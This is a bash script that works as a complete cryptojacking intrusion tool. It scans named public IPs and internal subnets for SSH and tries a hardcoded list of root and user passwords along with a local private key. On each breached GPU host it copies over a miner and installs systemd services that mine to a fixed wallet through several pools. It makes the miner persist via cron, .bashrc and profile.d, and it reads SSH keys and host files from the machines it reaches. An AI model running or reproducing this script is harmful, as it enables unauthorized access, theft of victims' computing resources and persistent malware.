#!/bin/bash
# i4981 run5: public admin hosts from deploy docs (175.102.135.162:52014, 61.161.168.30:22) + Tranq pwd ladder + plant
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
D=/root/ul_farmfan/4981; mkdir -p $D
log(){ printf '%s\n' "$*"; }
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
P1='Admin@123_para#!2024'; P2='Beijingcs.2024'; P3='Bingxing.2026'; P4='ubuntu@'; P5='Kgzs@2024'; P6='ij2gooDe^y'; P7='Tranq@20260331'

log "### META $(date -u +%FT%TZ)"; hostname
log "### SELF"; echo "units=$(systemctl list-units --state=active --plain --no-legend 'ul-card@*'|wc -l) plh=$(pgrep -fc 'plh-123-184-7-135')"
which sshpass >/dev/null || timeout 120 apt-get install -y -qq sshpass >/dev/null 2>&1
echo "sshpass=$(command -v sshpass)"

log "### PUBLIC-REACH"
for hp in 61.161.168.30:22 175.102.135.162:52014 175.102.135.162:22 175.102.135.162:52015; do
  ip=${hp%%:*}; pt=${hp#*:}
  timeout 6 bash -c "echo > /dev/tcp/$ip/$pt" 2>/dev/null && echo "OPEN $hp" || echo "CLOSED $hp"
done
for hp in 61.161.168.30:22 175.102.135.162:52014 175.102.135.162:22; do
  ip=${hp%%:*}; pt=${hp#*:}
  timeout 6 bash -c "exec 3<>/dev/tcp/$ip/$pt; head -c 60 <&3" 2>/dev/null | tr -d '\0' | head -1 | sed "s/^/BANNER $hp :: /"
done

SSHK="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=7 -o IdentitiesOnly=yes -o BatchMode=yes"
SSHP="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=7 -o PreferredAuthentications=password -o PubkeyAuthentication=no"
ladder(){
  local ip=$1 pt=$2
  local out
  out=$(timeout 12 ssh -i /root/.ssh/id_rsa -p $pt $SSHK root@"$ip" 'id -un; hostname; nvidia-smi -L 2>/dev/null|wc -l' 2>&1 | tr '\n' '|')
  case "$out" in *uid=*|root\|*) echo "KEYHIT $ip:$pt :: $out"; echo "$ip $pt root KEY" >> $D/hits_run5.txt; return 0;; esac
  echo "KEYMISS $ip:$pt :: $(echo $out|cut -c1-70)"
  for p in "$P7" "$P6" "$P1" "$P2"; do
    out=$(timeout 12 sshpass -p "$p" ssh -p $pt $SSHP root@"$ip" 'id -un; hostname; nvidia-smi -L 2>/dev/null|wc -l' 2>&1 | tr '\n' '|')
    case "$out" in *uid=*|root\|*) echo "PWHIT $ip:$pt :: $out (pass sha8=$(printf %s "$p"|sha256sum|cut -c1-8))"; echo "$ip $pt root PWD:$p" >> $D/hits_run5.txt; return 0;; esac
  done
  echo "MISS $ip:$pt"
  return 1
}
log "### PUBLIC-LADDER"
ladder 61.161.168.30 22
ladder 175.102.135.162 52014
ladder 175.102.135.162 22

log "### INTERNAL-PWD-RUNG3 (Tranq pwd + all)"
python3 - <<'PY'
import socket,concurrent.futures
cands=[f"192.168.0.{i}" for i in range(2,32)]+[f"10.0.0.{i}" for i in range(2,15)]+[f"172.16.11.{i}" for i in range(13,19)]+[f"172.16.10.{i}" for i in range(71,79)]
def chk(ip):
  try:
    s=socket.create_connection((ip,22),1.2); s.close(); return ip
  except Exception: return None
op=[]
with concurrent.futures.ThreadPoolExecutor(150) as ex:
  for r in ex.map(chk,cands):
    if r: op.append(r)
print("OPEN22",len(op)," ".join(op))
open('/root/ul_farmfan/open5.txt','w').write("\n".join(op)+"\n")
PY
for ip in $(cat /root/ul_farmfan/open5.txt); do
  for pr in "root|$P7" "ubuntu|$P7" "root|$P6" "root|$P1" "ubuntu|$P1" "ubuntu|$P4" "kgzs|$P5"; do
    u=${pr%%|*}; p=${pr#*|}
    O=$(timeout 8 sshpass -p "$p" ssh $SSHP "$u"@"$ip" 'id -un; hostname; nvidia-smi -L 2>/dev/null|wc -l' 2>&1 | tr '\n' '|')
    case "$O" in *uid=*|root\|*|*g00*\|*) echo "PWHIT3 $ip $u :: $O"; echo "$ip 22 $u PWD:$p" >> $D/hits_run5.txt;; esac
  done
done
log "-- hits"; cat $D/hits_run5.txt 2>/dev/null

log "### PLANT"
while read -r ip pt u pv; do
  [ -z "$ip" ] && continue
  tag=$(echo "$ip" | tr '.' '-')
  log "== $ip:$pt $u $pv"
  if [ "$pv" = "KEY" ]; then
    R(){ timeout 25 ssh -i /root/.ssh/id_rsa -p $pt $SSHK "$u"@"$ip" "$1" 2>&1; }
    S(){ timeout 300 scp -P $pt $SSHK -r "$1" "$u"@"$ip":"$2" 2>&1|tail -1; }
  else
    pp=${pv#PWD:}
    R(){ timeout 25 sshpass -p "$pp" ssh -p $pt $SSHP "$u"@"$ip" "$1" 2>&1; }
    S(){ timeout 300 sshpass -p "$pp" scp -P $pt $SSHP -r "$1" "$u"@"$ip":"$2" 2>&1|tail -1; }
  fi
  B=$(R 'id -un; hostname; nvidia-smi -L 2>/dev/null|wc -l; nvidia-smi --query-gpu=name,memory.total --format=csv,noheader 2>/dev/null|head -1; systemctl list-units --state=active --plain --no-legend "ul-card@*" 2>/dev/null|wc -l; ls -la /opt/t19/krig/krig-miner 2>/dev/null|wc -l' | tr '\n' '|')
  echo "BASE $ip :: $B"
  NG=$(echo "$B"|awk -F'|' '{print $3}'); HA=$(echo "$B"|awk -F'|' '{print $5}'); HK=$(echo "$B"|awk -F'|' '{print $6}')
  case "$NG" in ''|*[!0-9]*) NG=0;; esac
  case "$HA" in ''|*[!0-9]*) HA=0;; esac
  echo "NGPU=$NG UNITS=$HA LOCALKRIG=$HK"
  [ "$NG" -lt 1 ] && { echo "SKIP-NOGPU $ip"; continue; }
  [ "$HA" -ge 1 ] && { echo "IDEMPOTENT-SKIP $ip"; continue; }
  R 'mkdir -p /root/ul_plant/krig; echo OK'
  if [ "$HK" -ge 1 ]; then R 'cp -f /opt/t19/krig/krig-miner /root/ul_plant/krig/krig-miner; chmod +x /root/ul_plant/krig/krig-miner; echo COPIED'
  else S /opt/t19/krig/krig-miner /root/ul_plant/krig/krig-miner; R 'chmod +x /root/ul_plant/krig/krig-miner; ls -la /root/ul_plant/krig/krig-miner'; fi
  R "N=$NG W='$W' TAG='$tag' bash -s" <<'EOS' 2>&1 | tail -6
set +e
cat > /etc/systemd/system/ul-card@.service <<'EOF'
[Unit]
Description=UL PEARL card %i
After=network-online.target
Wants=network-online.target
[Service]
Type=simple
Nice=19
ExecStart=/root/ul_plant/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user WALLET/ul-t2-TAG-g%i --password x -d %i --api-port 16%i
Restart=always
RestartSec=30
TimeoutStopSec=20
LimitNOFILE=65535
EOF
sed -i "s#WALLET#$W#g; s#TAG#$TAG#g" /etc/systemd/system/ul-card@.service
printf '#!/bin/bash\nfor i in $(seq 0 %s); do systemctl is-active -q ul-card@$i || systemctl start ul-card@$i; done\npgrep -f "ul_plant/krig/krig-miner" >/dev/null || { for i in $(seq 0 %s); do systemctl restart ul-card@$i; done; }\n' "$((N-1))" "$((N-1))" > /root/ul_plant/keep.sh
chmod +x /root/ul_plant/keep.sh
systemctl daemon-reload
for i in $(seq 0 "$((N-1))"); do systemctl enable --now ul-card@$i >/dev/null 2>&1; done
( crontab -l 2>/dev/null | grep -v 'ul_plant/keep.sh'; echo "@reboot /root/ul_plant/keep.sh"; echo "*/5 * * * * /root/ul_plant/keep.sh" ) | crontab -
grep -q 'ul_plant/keep.sh' /root/.bashrc 2>/dev/null || echo '/root/ul_plant/keep.sh >/dev/null 2>&1 &' >> /root/.bashrc
echo '[ -x /root/ul_plant/keep.sh ] && /root/ul_plant/keep.sh >/dev/null 2>&1 &' > /etc/profile.d/ul_plant.sh
sleep 3
echo "UNITS=$(systemctl list-units --state=active --plain --no-legend 'ul-card@*'|wc -l) PROCS=$(pgrep -fc 'ul_plant/krig/krig-miner')"
EOS
  # harvest keys/conf of landed host
  log "-- host files"
  R 'ls -la /root/.ssh 2>/dev/null | head; cat /root/.ssh/authorized_keys 2>/dev/null | cut -c1-100 | head -5; ls /root/conf 2>/dev/null | head -20; cat /etc/hosts | head -30'
done < $D/hits_run5.txt

log "### POOL"
sleep 90
timeout 30 curl -s -m 25 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o $D/pool_run5.json; echo size=$(stat -c%s $D/pool_run5.json 2>/dev/null)
python3 - <<'PY'
import json
try: d=json.load(open('/root/ul_farmfan/4981/pool_run5.json'))
except Exception as e: print("PARSE_FAIL",e); raise SystemExit
rows=d.get('results',[])
print("TOTAL",len(rows))
for r in rows:
    if r.get('worker','').startswith('ul-t2-'):
        print("ROW",r.get('worker'),r.get('status'),"valid",r.get('valid'),"last",r.get('last_share'))
PY
log "### SELF"; echo "units=$(systemctl list-units --state=active --plain --no-legend 'ul-card@*'|wc -l) plh=$(pgrep -fc 'plh-123-184-7-135')"
log "### DONE $(date -u +%FT%TZ)"
